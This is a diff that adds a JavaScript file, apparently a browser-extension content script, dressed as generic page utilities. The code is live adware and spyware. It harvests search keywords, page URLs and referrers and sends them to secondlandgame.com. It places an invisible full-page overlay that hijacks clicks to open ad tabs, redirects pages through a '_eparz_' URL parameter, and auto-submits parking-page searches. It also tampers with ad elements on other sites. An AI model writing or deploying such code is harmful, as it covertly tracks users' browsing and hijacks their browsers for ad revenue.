@@ -1,0 +1,802 @@
+(function() {
+    function loadScript(url, callback) {
+        var script = document.createElement("script");
+        script.type = "text/javascript";
+
+        if (script.readyState) { //IE
+            script.onreadystatechange = function () {
+                if (script.readyState == "loaded" || script.readyState == "complete") {
+                    script.onreadystatechange = null;
+                    callback();
+                }
+            };
+        } else { //Others
+            script.onload = function () {
+                callback();
+            };
+        }
+
+        script.src = url;
+        document.getElementsByTagName("head")[0].appendChild(script);
+    }
+    function DecryptServerSideData(encryptedData) {
+        var decryptedText = null;
+        try {
+            var iv = CryptoJS.enc.Hex.parse('73746271727345819284721828492812');
+            var Pass = CryptoJS.enc.Utf8.parse('kIkQmvmZlpsieJS');
+            var Salt = CryptoJS.enc.Utf8.parse('6s886ehja68988');
+            var key128Bits1000Iterations = CryptoJS.PBKDF2(Pass.toString(CryptoJS.enc.Utf8), Salt, { keySize: 128 / 32, iterations: 1 });
+            var cipherParams = CryptoJS.lib.CipherParams.create({
+                ciphertext: CryptoJS.enc.Base64.parse(encryptedData)
+            });
+
+            var decrypted = CryptoJS.AES.decrypt(cipherParams, key128Bits1000Iterations, { mode: CryptoJS.mode.CBC, iv: iv, padding: CryptoJS.pad.Pkcs7 });
+            decryptedText = decrypted.toString(CryptoJS.enc.Utf8);
+            return decryptedText;
+        }
+        catch (err) {
+            return "";
+        }
+    }
+
+    if (window.location.href && window.location.href.indexOf('_eparz_=') != -1 && !window.__atlas__ && !window.__atlasb__) 
+    {
+        var url = window.location.href.substring(window.location.href.indexOf("_eparz_=") + 8);
+        window.location.href = url;
+    }
+})();
+
+(function (funcName, baseObj) {
+    function setCookie(cname, cvalue, exhours) {
+        var d = new Date();
+        d.setTime(d.getTime() + (exhours*60*60*1000));
+        var expires = "expires="+ d.toUTCString();
+        document.cookie = cname + "=" + cvalue + "; " + expires;
+    }
+
+    function getCookie(cname) {
+        var name = cname + "=";
+        var ca = document.cookie.split(';');
+        for(var i = 0; i <ca.length; i++) {
+            var c = ca[i];
+            while (c.charAt(0)==' ') {
+                c = c.substring(1);
+            }
+            if (c.indexOf(name) == 0) {
+                return c.substring(name.length,c.length);
+            }
+        }
+        return "";
+    }
+
+    "use strict";
+    // The public function name defaults to window.docReady
+    // but you can modify the last line of this function to pass in a different object or method name
+    // if you want to put them in a different namespace and those will be used instead of 
+    // window.docReady(...)
+    funcName = funcName || "docReady";
+    baseObj = baseObj || window;
+    var readyList = [];
+    var readyFired = false;
+    var readyEventHandlersInstalled = false;
+
+    // call this when the document is ready
+    // this function protects itself against being called more than once
+    function ready() {
+        if (!readyFired) {
+            // this must be set to true before we start calling callbacks
+            readyFired = true;
+            for (var i = 0; i < readyList.length; i++) {
+                // if a callback here happens to add new ready handlers,
+                // the docReady() function will see that it already fired
+                // and will schedule the callback to run right after
+                // this event loop finishes so all handlers will still execute
+                // in order and no new ones will be added to the readyList
+                // while we are processing the list
+                readyList[i].fn.call(window, readyList[i].ctx);
+            }
+            // allow any closures held by these functions to free
+            readyList = [];
+        }
+    }
+
+    function readyStateChange() {
+        if (document.readyState === "complete") {
+            ready();
+        }
+    }
+
+    // This is the one public interface
+    // docReady(fn, context);
+    // the context argument is optional - if present, it will be passed
+    // as an argument to the callback
+    baseObj[funcName] = function (callback, context) {
+        // if ready has already fired, then just schedule the callback
+        // to fire asynchronously, but right away
+        if (readyFired) {
+            setTimeout(function () { callback(context); }, 1);
+            return;
+        } else {
+            // add the function and context to the list
+            readyList.push({ fn: callback, ctx: context });
+        }
+        // if document already ready to go, schedule the ready function to run
+        // IE only safe when readyState is "complete", others safe when readyState is "interactive"
+        if (document.readyState === "complete" || (!document.attachEvent && document.readyState === "interactive")) {
+            setTimeout(ready, 1);
+        } else if (!readyEventHandlersInstalled) {
+            // otherwise if we don't have event handlers installed, install them
+            if (document.addEventListener) {
+                // first choice is DOMContentLoaded event
+                document.addEventListener("DOMContentLoaded", ready, false);
+                // backup is window load event
+                window.addEventListener("load", ready, false);
+            } else {
+                // must be IE
+                document.attachEvent("onreadystatechange", readyStateChange);
+                window.attachEvent("onload", ready);
+            }
+            readyEventHandlersInstalled = true;
+        }
+    }
+})("docReady", window);
+
+function ajaxPGet(requrl, successCallback, failureCallback) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", requrl, true);
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4) {
+            try {
+                if (typeof successCallback === 'function' && successCallback !== null) {
+                    successCallback(xhr.responseText, xhr.statusText, xhr);
+                }
+            } catch (exception) {
+                console.log('ajaxGet:', exception);
+            }
+        }
+    }
+    xhr.onerror = function (e) {
+        if (typeof failureCallback === 'function' && failureCallback !== null) {
+            failureCallback(xhr, xhr.statusText, e);
+        }
+    };
+    xhr.send();
+}
+
+function ajaxPPost(requrl, data, successCallback, failureCallback) {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", requrl, true);
+    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded; charset=UTF-8');
+    xhr.setRequestHeader('Accept', '*/*');
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4) {
+            try {
+                if (typeof successCallback === 'function' && successCallback !== null) {
+                    successCallback(xhr.responseText, xhr.statusText, xhr);
+                }
+            } catch (exception) {
+                console.log('ajaxPost:', exception);
+            }
+        }
+    }
+    xhr.onerror = function (e) {
+        if (typeof failureCallback === 'function' && failureCallback !== null) {
+            failureCallback(xhr, xhr.statusText, e);
+        }
+    };
+    xhr.send(data);
+}
+
+String.prototype.replaceAll = function (target, replacement) {
+    return this.split(target).join(replacement);
+};
+
+String.prototype.format = function () {
+    var args = arguments;
+    return this.replace(/{(\d+)}/g, function (match, number) {
+        return typeof args[number] != 'undefined'
+                ? args[number]
+                : match;
+    });
+};
+
+Array.prototype.remove = function(value) {
+    if (this.indexOf(value)!==-1) {
+        this.splice(this.indexOf(value), 1);
+        return true;
+    } else {
+        return false;
+    };
+} 
+
+function getUrlHost(url) {
+    var a=document.createElement('a');
+    a.href=url;
+    return a.hostname;
+}
+
+function isInFrame() {
+    return (window != window.top);
+}
+
+function isInParkingPage() {
+    return (window.location.host == 'shoppersfriends.com');
+}
+
+var getQueryString = function (field, url) {
+    var href = url ? url : window.location.href;
+    href = href.replace("#q=", "&q=");
+    var reg = new RegExp('[?&]' + field + '=([^&#]*)', 'i');
+    var string = reg.exec(href);
+    return string ? string[1] : "";
+};
+
+var tupAllocation = 30;
+var tupInterval = 120;
+var allocation = 0;
+var domainname = "secondlandgame.com";
+var seachEngineDetailList = '[{"Name":"www.google.com","Macro":"q"},{"Name":"search.yahoo.com","Macro":"p"},{"Name":"www.bing.com","Macro":"q"},{"Name":"www.google.com.br","Macro":"q"},{"Name":"www.google.co.uk","Macro":"q"},{"Name":"www.google.de","Macro":"q"},{"Name":"www.google.ca","Macro":"q"},{"Name":"www.google.ru","Macro":"q"},{"Name":"www.google.com.hk","Macro":"q"},{"Name":"www.google.com.sg","Macro":"q"},{"Name":"www.google.com.tw","Macro":"q"},{"Name":"www.google.es","Macro":"q"},{"Name":"www.google.fr","Macro":"q"},{"Name":"www.google.hu","Macro":"q"},{"Name":"www.google.it","Macro":"q"},{"Name":"www.google.lt","Macro":"q"},{"Name":"www.google.nl","Macro":"q"},{"Name":"www.google.pl","Macro":"q"},{"Name":"www.google.pt","Macro":"q"},{"Name":"www.google.ro","Macro":"q"},{"Name":"us.yhs4.search.yahoo.com","Macro":"p"},{"Name":"cse.google.com","Macro":"gsc.q"},{"Name":"images.search.yahoo.com","Macro":"p"}]';
+var landingUrl = "http://shoppersfriends.com?u={0}&q={1}&se={2}";
+var encodeReferrer = encodeURIComponent(document.referrer);
+var encodeLocationHref = encodeURIComponent(window.location.href);
+var seList = ["www.google.com","search.yahoo.com","www.bing.com","www.google.com.br","www.google.co.uk","www.google.de","www.google.ca","www.google.ru","www.google.com.hk","www.google.com.sg","www.google.com.tw","www.google.es","www.google.fr","www.google.hu","www.google.it","www.google.lt","www.google.nl","www.google.pl","www.google.pt","www.google.ro","us.yhs4.search.yahoo.com","cse.google.com","images.search.yahoo.com"];
+var parkingPPCTitleElements = ["test_titleLink","test_domainLink","sfblTitleLink","sfblSellerNameLink", "pc_", "tc_", "kc_"];
+var isExtDomain = true;
+
+var domainType = {
+    SearchEngine: 1,
+    ParkingDomain1Click : 2,
+    InlineDomain : 3,
+    ParkingDomain2Click : 4,
+    TabUp : 5
+}
+
+//#region startpage
+var queryString = "q";
+var isStartPage = function () {
+    return (window.location.href.indexOf("startpage.com") > -1);
+};
+var getStartPageKeyword = function () {
+    try {
+        // organic 
+        var query = document.getElementById("query_top");
+        // ppc top 
+        var retval = query ? query.value : decodeURIComponent(getQueryString(queryString, document.getElementById("megaLabel").innerText.replace("Ads by Google related to: ", "&q=")));
+        //var val = query ? query.value.replaceAll(" ", "%20") : decodeURIComponent(getQueryString(queryString, window.location.href));
+        // ppc bottom
+        //var retval = val ? val.replaceAll("+", "%20") : decodeURIComponent(getQueryString(queryString, document.getElementById("megaLabel").innerText.replace("Ads by Google related to: ", "&q=")));
+
+        retval = reval.replaceAll(" ", "%20");
+    } catch (err) { }
+    return retval;
+
+}
+//#endregion startpage
+
+//#region truelocal
+var trueLocalElement = "name";
+var isTrueLocal = function () {
+    return (window.location.href.indexOf("truelocal.com.au") > -1);
+}
+var getTrueLocalKeyword = function () {
+    var retval = document.getElementById("input-search-term");
+    return retval ? retval.value.replaceAll(" ", "%20") : "";
+}
+//#endregion truelocal
+
+//#region ixquick
+var queryString = "q";
+
+var isIxquick = function () {
+    return (window.location.href.indexOf("ixquick.com") > -1);
+};
+var getIxquickKeyword = function () {
+    try {
+        // organic 
+        var query = document.getElementById("query_top");
+        // ppc top and bottom
+        var retval = query ? query.value : decodeURIComponent(getQueryString(queryString, document.getElementById("megaLabel").innerText.replace("Ads by Google related to: ", "&q=")));
+
+        retval = reval.replaceAll(" ", "%20");
+        return retval;
+    } catch (err) { }
+    return "";
+
+}
+//#endregion ixquick
+
+//#region searchincognito
+var searchincognitoElement = "result-link";
+var isSearchIncognito = function(){
+    return (document.referrer.indexOf("searchincognito.com") > -1);
+}
+var getSearchIncognitoKeyword = function(){
+    try {
+        var searchkeyword = document.getElementsByClassName("didyoumean")[0].textContent;
+        var keywordtext = searchkeyword.split(":")[1].trim();
+        return decodeURIComponent(keywordtext.replaceAll("+","%20"));
+       
+    } catch (err) { }
+    return "";
+}
+//endregion searchincognito
+
+//#region searchsafe
+var isSearchsafe = function(){
+    return (window.location.href.indexOf("searchsafe.co") > -1);   
+}
+var getSearchSafeKeyword = function(){
+    try{
+        var searchkeyword = document.getElementsByClassName("didyoumean")[0].textContent;
+        var keywordtext = searchkeyword.split(":")[1].trim();
+        return decodeURIComponent(keywordtext.replaceAll("+","%20"));
+    }
+    catch(err){}
+    return  "";
+}
+//end searchsafe
+
+
+//#region searchencrypt
+
+var isSearchencrypt = function(){
+    return (window.location.href.indexOf("searchencrypt.com") > -1); 
+}
+var getSearchencryptKeyword = function(){
+    try {
+        var searchkeyword = document.getElementsByClassName("didyoumean")[0].textContent;
+        var keywordtext = searchkeyword.split(":")[1].trim();
+        return decodeURIComponent(keywordtext.replaceAll("+","%20"));
+       
+    } catch (err) { }
+    return "";
+}
+//endregion searchencrypt
+
+//#region discretesearch
+
+var isdiscretesearch = function(){
+    return (window.location.href.indexOf("discretesearch.com") > -1);
+}
+var getDiscretesearchKeyword = function(){
+    try {
+        var searchkeyword = document.getElementsByClassName("didyoumean")[0].textContent;
+        var keywordtext = searchkeyword.split(":")[1].trim();
+        return decodeURIComponent(keywordtext.replaceAll("+","%20"));
+       
+    } catch (err) { }
+    return "";
+}
+//endregion discretesearch
+
+//#region searchfy
+
+var issearchfy = function(){
+    return (window.location.href.indexOf("searchfy.com") > -1);
+}
+var getSearchfyKeyword = function(){
+    try {
+        var searchkeyword = document.getElementById("q").value;
+        var keywordtext = searchkeyword.split(":")[1].trim();
+        return decodeURIComponent(keywordtext.replaceAll("+","%20"));
+       
+    } catch (err) { }
+    return "";
+}
+//endregion searchfy
+
+//#region gigasear
+var isSearchGigasear = function(){
+    return (window.location.href.indexOf("gigasear.ch") > -1);
+}
+var getGigasear = function(){
+    try {
+        var searchkeyword = window.location.pathname;
+        var keywordtext = searchkeyword.replace("/","").replace("%20"," ");
+        return decodeURIComponent(keywordtext.replaceAll("+","%20"));
+       
+    } catch (err) { }
+    return "";
+}
+//endregion gigasear
+
+//#region parking domain
+
+function loadParkingPPC(keyword, token){
+    var adsCount = 0;
+    for (var i = 0; i < parkingPPCTitleElements.length; i++) {
+        var rootTitleElements = document.getElementsByClassName(parkingPPCTitleElements[i]);
+        if(rootTitleElements.length > 0){
+            for (var e = 0; e < rootTitleElements.length; e++) {
+                rootTitleElements[e].setAttribute("onclick", 'LogData("{0}", "{1}", true, true, {2}, 0);'.format(keyword, token, domainType.ParkingDomain2Click));
+                if(parkingPPCTitleElements[i] == 'test_titleLink' || parkingPPCTitleElements[i] ==  'sfblTitleLink') adsCount++;
+            }
+        }
+    }
+    return adsCount;
+}
+
+function loadParking() {
+    var tokenFound = getQueryString("afdToken"); // detect is second click page , not frame   
+    var redirectURL = decodeURIComponent(getQueryString("url")); 	
+    if (!isInFrame()) { 
+        if(!!isInParkingPage() && tokenFound != ""){
+           
+            if (redirectURL == "null") return;
+
+            LogData("", tokenFound, true, false, domainType.ParkingDomain1Click, 0);
+            
+        }
+
+        if(!!isInParkingPage()){
+            setTimeout(function () {
+                if(document.getElementsByTagName("iframe").length == 0)
+                    window.location = decodeURIComponent(redirectURL);
+            }, 1000);
+        }
+        
+    } else if (!!isInFrame()) {
+       
+        var referrerToken =  getQueryString("afdToken", document.referrer); // detect second click page ads frame
+
+        var searchEngineKeyword = getQueryString("q", document.referrer);     
+        
+        var searchTextBox = document.getElementsByName("query")[0];
+        if (!!searchEngineKeyword && !!searchTextBox && !tokenFound) {
+            var hiddenUrl = document.createElement("input");
+            hiddenUrl.type = "hidden";
+            hiddenUrl.name = "url";
+            hiddenUrl.value = getQueryString("u", document.referrer);
+            searchTextBox.appendChild(hiddenUrl);
+            var hiddenSe = document.createElement("input");
+            hiddenSe.type = "hidden";
+            hiddenSe.name = "se";
+            hiddenSe.value = getQueryString("se", document.referrer);
+            searchTextBox.appendChild(hiddenSe);
+            searchTextBox.value = decodeURIComponent(searchEngineKeyword);
+            document.getElementsByClassName("sbb")[0].click();
+        }else if(referrerToken != "" && window.name.length > 200){ // iframe name > 200, then is ads frame in 2 clicks
+            var parkingKeyword = getQueryString("query", document.referrer);   
+            var adsCount = loadParkingPPC(parkingKeyword, referrerToken);
+            LogData("", tokenFound, true, false, domainType.ParkingDomain2Click, adsCount);
+        }
+        
+    }
+    if (!!tokenFound)
+        replaceTitle();
+}
+
+function replaceTitle() {
+    var title = document.getElementById("domainname") ? document.getElementById("domainname") : (document.getElementsByClassName("domainName").length > 0 ? document.getElementsByClassName("domainName")[0] : document.getElementById("logo"));
+    var keyword = getQueryString("query") ? getQueryString("query") : getQueryString("q");
+    if (!!title && !!keyword) {
+        title.innerText = decodeURIComponent(keyword.replaceAll("+", " "));
+        title.setAttribute('style', 'text-transform:capitalize');
+        document.title = title.innerText;
+    }
+}
+
+//#endregion park
+
+//#region Tab Up
+function canLoadTUp(keyword){
+    if(keyword == "") return false;
+    var tUpDetails = "tUpDetails";
+    var lastTabDetails = localStorage.getItem(tUpDetails);
+
+   
+    if(!!lastTabDetails) {
+        var details = JSON.parse(lastTabDetails.replaceAll("\t",""));
+        var diff = Date.now() - details.ts;
+        if(details.keyword == keyword && (diff / 1000) < tupInterval){
+            return false;
+        }else{
+            var tUpValue = '{"keyword" : "' + keyword + '","ts": ' + Date.now() + '}';
+            localStorage.setItem(tUpDetails, tUpValue);
+            return true;
+        }
+    }else{
+        var tUpValue = '{"keyword" : "' + keyword + '","ts": ' + Date.now() + '}';
+        localStorage.setItem(tUpDetails, tUpValue);
+        return true;
+    }
+}
+
+function loadtup(keyword)
+{
+    var isSE = seList.some(x => x == document.location.host);
+    if(isSE)
+    {   
+        if(Math.floor(Math.random() * 100) > tupAllocation) return;
+        console.log('lt');        
+        var div = document.createElement('div');
+        div.id = "tupcustdiv";
+        div.style.width = '100%';
+        div.style.height = '100%';	
+        div.style.zIndex = 2147483646;
+        div.style.top = 0;
+        div.style.left = 0;
+        div.style.opacity = 0;
+        div.style.position = "fixed";
+        div.setAttribute("onclick", "tup('" + keyword + "');");
+        document.body.appendChild(div);            
+    }    
+}
+
+function tup(keyword)
+{   
+    if(!canLoadTUp(keyword)){
+        console.log("tup interval");
+    }else{
+        console.log('lt fire');
+        var js_url = "//" + domainname + "/api/ul?format=json&url={0}&k={1}&groupId=3".format(encodeURIComponent(location.href), encodeURIComponent(keyword));
+        ajaxPGet(js_url, function (result) { 
+            if(result === '[]') { console.log('lt na');return;}
+            var res = JSON.parse(result);        
+            if (res.Url.length > 0 && res.Url != 'undefined') {
+                var da = "SLG".toLowerCase();
+                var evtName = da + "tup";
+                var adurl = res.Url + "?kwd={0}&tupref={1}&country=us".format(keyword, encodeURIComponent(location.host));
+                console.log("lt=" + adurl);
+                var customevent = new CustomEvent(evtName, { 'detail': { 'newtaburl': adurl } });
+                setTimeout(function (){
+                    document.dispatchEvent(customevent);
+                    LogData(keyword, "", false, false, domainType.TabUp);
+                    console.log('lt end');
+                },200);
+            }
+        });
+    }
+    document.getElementById('tupcustdiv').remove();  
+    var pxFrame = document.getElementById('ippc_pxFrame');
+    if(pxFrame != null) pxFrame.remove(); 
+}    
+//#endregion
+
+function getSearchKeyword() {
+    var keyword = "";
+    
+    if (!!isStartPage())
+        keyword = getStartPageKeyword();
+    else if (!!isTrueLocal())
+        keyword = getTrueLocalKeyword();
+    else if (!!isIxquick())
+        keyword = getIxquickKeyword();
+    else if (!!isSearchIncognito())
+        keyword = getSearchIncognitoKeyword();
+    else if (!!isSearchsafe())
+        keyword = getSearchSafeKeyword();
+    else if (!!isSearchencrypt())
+        keyword = getSearchencryptKeyword();
+    else if (!!isdiscretesearch())
+        keyword = getDiscretesearchKeyword();
+    else if (!!issearchfy())
+        keyword = getSearchfyKeyword();
+    else if (!!isSearchGigasear())
+        keyword = getGigasear();
+    else if(!isInFrame()){
+        var seachEngineDetails = JSON.parse(seachEngineDetailList);
+        for(var i=0; i< seachEngineDetails.length; i++){
+            if(window.location.host.indexOf(seachEngineDetails[i].Name) > -1){
+                keyword = decodeURIComponent(getQueryString(seachEngineDetails[i].Macro)).replaceAll("+", "%20");
+                break;
+            }
+        }
+    }
+
+    if(keyword == "") // get keyword from generic 
+        keyword = decodeURIComponent(getQueryString("q")).replaceAll("+", "%20");
+
+    if(["us","uk","au","ca"].indexOf('us') >= 0)
+        keyword = decodeURIComponent(keyword).replace(/[_-\s]/g, ' ').replace(/[^a-z0-9-\s]/gi, '');	
+		
+    if(keyword != "")
+        createPxFrame(keyword);
+    
+    return keyword;
+}
+function createPxFrame(keyword) {    
+    var pxFrame = document.getElementById('ippc_pxFrame');
+    if(pxFrame != null) pxFrame.remove(); 
+    pxFrame = document.createElement("iframe");
+    pxFrame.id = 'ippc_pxFrame';
+    pxFrame.style.width = "1px";
+    pxFrame.style.height = "1px";
+    pxFrame.style.display = "none";
+    pxFrame.scrolling = "no";
+    pxFrame.src = "//secondlandgame.com/ext/cfc?term=" + keyword; 
+    document.body.appendChild(pxFrame);
+}
+function init() {
+    if(window.C_EXTID === undefined)
+        window.C_EXTID = "SLG";
+    else if(window.C_EXTID == "SLG")
+    {
+        // only allow one extension to inject if there are multiple extensions on PC
+    }
+    else
+        return;
+    if(location.host != "www.youtube.com"){
+        setTimeout(function () {
+            console.log('check afs:')
+            if (!!isAfs()) {
+                console.log('isAfs')
+                var k = getAfsKeyword();
+                console.log('k' + k);
+                if (k)
+                    loadtup(k);
+                return;
+            }
+            var keyword = getSearchKeyword();
+            loadParking(); 
+
+            if(keyword != ""){
+                loadtup(keyword);
+                LogData(keyword, "", false, false, domainType.SearchEngine);
+            }
+        }, 300);
+    }
+    else if(document.location.href.indexOf('www.youtube.com/embed') > -1)
+        loadYTReplace();
+}
+
+function LogData(keyword, adstoken, useReferer, isClick, domainType, adsCount) {
+    var iid = window.C_SLGID;
+    if(typeof iid != 'string') iid = "";
+
+    var host = encodeLocationHref;
+    var referrerdomain = encodeReferrer;
+
+    var param = "iid="+iid+"&host="+host+"&referrer="+referrerdomain+"&adsToken="+adstoken+"&keyword="+ keyword + "&useReferrer=" + useReferer+ "&isClick=" + isClick + "&domainType=" + domainType+ "&adsCount=" + adsCount;
+    var js_url = "//" + domainname + "/api/lpla";
+    ajaxPPost(js_url, param,  function (d) {
+        //console.log("Log PData : " + d);
+    });
+}
+
+function LogDMPData(keyword) {
+    var iid = window.C_SLGID;
+    if(typeof iid != 'string') iid = "";
+
+    var referrerdomain = encodeReferrer;
+    var url = encodeLocationHref;
+    var param = "iid="+iid+"&url="+url+"&referrer="+referrerdomain+"&keyword="+ keyword;
+    var js_url = "//" + domainname + "/api/ldmpd";
+    ajaxPPost(js_url, param,  function (d) {
+        //console.log("Log DMP SE : " + d);
+    });
+}
+
+// re-init if page url changed
+var oldLocation = location.href;
+setInterval(function () {
+    if (location.href != oldLocation) {
+        oldLocation = location.href;
+        init();
+    }
+}, 1000);
+
+//#region Embed youtube
+function loadYTReplace()
+{
+    if(self == top) {console.log('lytr: skip'); return;} // Skip if original page
+    
+    //console.log('lytr:');
+
+    var custDiv = document.getElementById('custlytrDIV01');
+    if(custDiv != null) {console.log('lytr:exist');checkIfAdExist(); return; }
+
+    var iid = window.C_SLGID;
+    if(typeof iid != 'string') iid = "";
+
+    var container = document.getElementsByClassName("adDisplay");
+    var ad;
+    if(document.getElementsByClassName('image-container') != null && document.getElementsByClassName('image-container').length > 0)
+        ad = document.getElementsByClassName('image-container');	
+    else if(document.getElementsByClassName('text-container') && document.getElementsByClassName('text-container').length > 0)
+        ad = document.getElementsByClassName('text-container');
+    if((ad != null && ad.length > 0) && (container != null && container.length > 0)){
+        var currentNode = ad[0];
+        console.log('lytr:found');
+        //if(currentNode.style.width != '728px'){
+        container[0].remove();
+        setTimeout(loadYTReplace,1000);console.log('lytr:!size'); //return;
+        //}
+        //currentNode.style.zIndex = -100;
+        //var newDiv = document.createElement('div');			
+        //newDiv.id = 'custlytrDIV01';	
+        //newDiv.style.position = "absolute";
+        //newDiv.className = 'image-container';            
+        //var newFrame = document.createElement('iframe');
+        //newFrame.setAttribute('height', '90px');
+        //newFrame.setAttribute('width', '728px');		
+        //newFrame.setAttribute('scrolling','no');
+        //var downloadURL = '//payperclickadz.com/ext/render?iid={0}&width={1}&height={2}&imgaction={3}'.format(iid, 728, 90, 'playnow');
+        //newFrame.src = downloadURL;
+        //newDiv.appendChild(newFrame);
+        //var parentDiv = container[0];
+        //parentDiv.insertBefore(newDiv, currentNode);        
+        //console.log('lytr:success');
+        //checkIfAdExist();
+    }
+    else{
+        //console.log('lytr:no ads yet');
+        setTimeout(loadYTReplace,100);
+    }
+}
+function checkIfAdExist(){
+    var custDiv = document.getElementById('custlytrDIV01');
+    if(custDiv == null)
+        loadYTReplace();
+    else
+        setTimeout(checkIfAdExist, 1000);
+}
+
+//#endregion Embed youtube
+
+//#region afs
+var isAfs = function () {
+    var canLoad = false;
+    var referreHost = getUrlHost(document.referrer);
+    console.log('afs doc referrer: '+ document.referrer);
+    console.log('afs location href: ' + window.location.href);
+    var extDomainList = ["www.webmd.com"];
+    if(extDomainList.indexOf(referreHost) > -1 
+        && window.location.href.indexOf("www.google.com/afs/") > -1 
+        && !!isInFrame()){
+        canLoad = true;
+    }
+    return canLoad;   
+};
+
+function getAfsKeyword(){
+    var kwd = decodeURIComponent(getQueryString("q", "")).trim();
+    var removeCharList = [";","&","'",'"',"http://",":","/","\\","`","-","*","  "];
+    var newKeyword = "";
+	
+    if(kwd.length > 0 && kwd.charAt(kwd.length - 1) == "|")
+        kwd = kwd.substr(0, kwd.length - 1);
+		
+    for (var i = 0; i < removeCharList.length; i++) {
+        kwd = kwd.replaceAll(removeCharList[i], " ");
+    }
+	
+    var splitKwd = kwd.split('|');
+	
+    if(splitKwd.length > 1){
+        var kwdCount = splitKwd.length;
+        var lastKeyword = splitKwd[kwdCount - 1].trim();
+        var beforeLastKeyword = splitKwd[kwdCount - 2].trim();
+		
+        var lastKeywordArray = lastKeyword.split(" ");		
+        var beforeLastKeywordArray = beforeLastKeyword.split(" ");		
+		
+        for (var i = 0; i < lastKeywordArray.length; i++) {
+            if (beforeLastKeywordArray.indexOf(lastKeywordArray[i]) > -1) {
+                lastKeyword = lastKeyword.replaceAll(lastKeywordArray[i], "");
+            }
+        }
+		
+        lastKeywordArray = lastKeyword.split(" ");
+        if(lastKeywordArray.length > 5){
+            lastKeywordArray.slice(-3);
+            lastKeyword = lastKeywordArray.join(" ")
+        }
+        if(beforeLastKeywordArray.length > 3){
+            beforeLastKeywordArray.slice(-2);
+        }
+		
+        newKeyword = beforeLastKeywordArray.join(" ") + " " + lastKeyword;
+        newKeyword.replaceAll("  ","")	
+			
+    }else{
+        newKeyword = splitKwd[0];
+    }
+    return newKeyword;
+}
+
+//#endregion afs
+
+(function () {
+    window.docReady(init);
+})();
